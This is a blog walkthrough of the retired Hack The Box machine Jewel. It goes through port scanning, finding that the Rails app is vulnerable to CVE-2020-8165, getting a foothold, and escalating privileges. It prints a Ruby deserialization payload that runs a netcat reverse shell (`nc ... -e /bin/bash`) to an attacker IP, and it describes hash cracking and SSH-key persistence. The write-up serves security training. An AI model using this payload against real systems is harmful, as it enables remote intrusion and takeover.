---
layout: post  
title: "Jewel: Hack The Box Walkthrough"
date: 2021-02-14 07:27:49 +0000
last_modified_at: 2021-02-14 07:27:49 +0000
category: Walkthrough
tags: ["Hack The Box", Jewel, retired, Linux, Medium]
comments: true
protect: false
image:
  feature: jewel-htb-walkthrough.png
---

This post documents the complete walkthrough of Jewel, a retired vulnerable [VM][1] created by [polarbearer][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Jewel is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.211 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-10-11 11:15:55 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.211
Discovered open port 22/tcp on 10.10.10.211
Discovered open port 8000/tcp on 10.10.10.211
```

Nothing unusual stood out. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,8000,8080 -A --reason 10.10.10.211 -oN nmap.txt
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 10.10.10.211 Git
|_Requested resource was http://10.10.10.211:8000/gitweb/
8080/tcp open  http    syn-ack ttl 63 nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
```

Hmm. Looks like there are two `http` services—`8000/tcp` and `8080/tcp`. Here's what they look like.

_`8000/tcp`_

{% include image.html image_alt="16d7278f.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/16d7278f.png" %}

_`8080/tcp`_

{% include image.html image_alt="7c18c765.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/7c18c765.png" %}

### Ruby on Rails (or simply Rails)

The snapshot downloaded from `gitweb` reveals a Ruby on Rails project, a.k.a BL0G!

{% include image.html image_alt="5ff65fe4.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/5ff65fe4.png" %}

Upon entering the directory, I got a warning that `ruby-2.5.5` is not installed. Not that it's a big deal—it saves me time to determine the version of ruby used in this project.

{% include image.html image_alt="243638b5.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/243638b5.png" %}

Anyway, opening up `Gemfile` reveals that the `rails` version used is `5.2.2.1`.

{% include image.html image_alt="6349aa85.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/6349aa85.png" %}

### CVE-2020-8165 - Unintended unmarshalling in ActiveSupport resulting in RCE

While I was navigating through the Rails application, I saw the following code snippet in `users_controller.rb`.

{% include image.html image_alt="d313a479.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/d313a479.png" %}

It's clear that Redis is used as a cache for updating username. Googling for "**rails radiscachestore exploit**" landed me in [here](https://github.com/advisories/GHSA-2p68-f74v-9wc6).

{% include image.html image_alt="f8dde66c.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/f8dde66c.png" %}

So, if I can introduce a malicious string into the cache, I can achieve remote code execution!

### Updating Username

Long story short, I signed up for an account and in the user's profile lies the username update feature.

{% include image.html image_alt="821076e4.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/821076e4.png" %}

## Foothold

I found this GitHub [repository](https://github.com/masahiro331/CVE-2020-8165) that actually goes through how to exploit CVE-2020-8165 by googling for "**CVE-2020-8165 github**".

```
$ bundle exec rails console

irb(main):> code = '`nc 10.10.14.62 1234 -e /bin/bash`'
irb(main):> erb = ERB.allocate
irb(main):> erb.instance_variable_set :@src, code
irb(main):> erb.instance_variable_set :@filename, "1"
irb(main):> erb.instance_variable_set :@lineno, 1
irb(main):> payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
irb(main):> puts URI.encode_www_form(payload: payload)
```

I'll use the steps above to generate a url-encoded payload and submit to the user update via Burp Repeater.

{% include image.html image_alt="651bb90f.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/651bb90f.png" %}

_Request_

{% include image.html image_alt="2f50be19.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/2f50be19.png" %}

_Response_

{% include image.html image_alt="3fb8359c.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/3fb8359c.png" %}

You may get a **500 Internal Server Error** but rest assured the payload is marshalled into Redis. All you need to do is to refresh your profile page and the reverse shell appears on your `netcat` listener.

{% include image.html image_alt="8d69cf72.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/8d69cf72.png" %}

The file `user.txt` is at `bill`'s home directory.

{% include image.html image_alt="5ac8f5b9.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/5ac8f5b9.png" %}

To maintain persistence, let's plant a SSH public key we control into `/home/bill/.ssh/authorized_keys`.

## Privilege Escalation

During enumeration of `bill`'s account, I notice that `PasswordAuthentication` in SSH is set to `no`, so this might meant that we need to look for `bill`'s password to see what's in `sudo -l`, for example. Not knowing where to begin, I first look for files that were modified close to the modification date/time of `user.txt` by first `touch`ing a reference file with the same modification date/time as `user.txt`.

{% include image.html image_alt="8528f6ea.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/8528f6ea.png" %}

Notice the file `.google_authenticator`? Are we looking at two-factor authentication (2FA) here? Let's keep that in mind while we continue our enumeration. However, I can't help but notice that 2FA via Google Authenticator is implemented in PAM. More on that later.

{% include image.html image_alt="5add717a.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/5add717a.png" %}

### Cracking `bill`'s password

Meanwhile, I notice a backup of the blog's database.

{% include image.html image_alt="05ee02c7.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/05ee02c7.png" %}

Look at the difference between the current database and the backup.

{% include image.html image_alt="db550927.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/db550927.png" %}

Sending them hashes for offline cracking revealed the following:

{% include image.html image_alt="6436f403.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/6436f403.png" %}

I don't suppose `spongebob` is `bill`'s password? Well, let's find out.

{% include image.html image_alt="4ea6f1e4.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/4ea6f1e4.png" %}

FML...

### Google Authenticator

Recall the file `.google_authenticator`? Turns out it contains the secret for Google Authenticator.

{% include image.html image_alt="9b0efac9.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/9b0efac9.png" %}

We can install a Firefox extension from `https://authenticator.cc/` to get the one-time PIN (OTP). Having said that, I don't recommend installing untrusted extension, especially if it's not developed by Google, for private use.

{% include image.html image_alt="11aed4fb.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/11aed4fb.png" %}

With that, we can see what `bill` can do as `root` from `sudo -l`.

{% include image.html image_alt="e0fa646f.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/e0fa646f.png" %}

### GTFOBins - `gems`

According to [GTFOBins](https://gtfobins.github.io/gtfobins/gem/),

{% include image.html image_alt="168ba6bf.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/168ba6bf.png" %}

I guess the end is here...

{% include image.html image_alt="85abd43c.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/85abd43c.png" %}

Retrieving `root.txt` is trivial with a `root` shell.

{% include image.html image_alt="e53a6060.png" image_src="/3232fd0d-e875-4c50-81ad-6ebae8e5f843/e53a6060.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/282
[2]: https://www.hackthebox.eu/home/users/profile/159204
[3]: https://www.hackthebox.eu/
